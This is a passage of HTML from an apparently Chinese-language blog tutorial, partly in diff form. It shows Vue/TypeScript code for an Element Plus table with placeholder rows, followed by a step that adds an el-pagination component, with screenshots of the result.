class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup&gt;</span><br><span class="line">const tableData = [</span><br><span class="line">  &#123;</span><br><span class="line">    date: &#x27;2016-05-03&#x27;,</span><br><span class="line">    name: &#x27;Tom&#x27;,</span><br><span class="line">    address: &#x27;No. 189, Grove St, Los Angeles&#x27;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    date: &#x27;2016-05-02&#x27;,</span><br><span class="line">    name: &#x27;Tom&#x27;,</span><br><span class="line">    address: &#x27;No. 189, Grove St, Los Angeles&#x27;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    date: &#x27;2016-05-04&#x27;,</span><br><span class="line">    name: &#x27;Tom&#x27;,</span><br><span class="line">    address: &#x27;No. 189, Grove St, Los Angeles&#x27;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    date: &#x27;2016-05-01&#x27;,</span><br><span class="line">    name: &#x27;Tom&#x27;,</span><br><span class="line">    address: &#x27;No. 189, Grove St, Los Angeles&#x27;,</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>2.找到分页，引入分页<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702478241936-99f04e0f-0a46-45ea-8cec-2849c886f97f.png" alt="image.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;el-pagination</span><br><span class="line">    :page-size=&quot;20&quot;</span><br><span class="line">    :pager-count=&quot;11&quot;</span><br><span class="line">    layout=&quot;prev, pager, next&quot;</span><br><span class="line">    :total=&quot;1000&quot;</span><br><span class="line">  /&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>
-
-<p>刷新浏览器页面，最终的页面如下：<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702478272976-d56c923e-07ad-4c65-a0c9-0ca9a971be3a.png" alt="image.png"></p>
 
       
     </div>
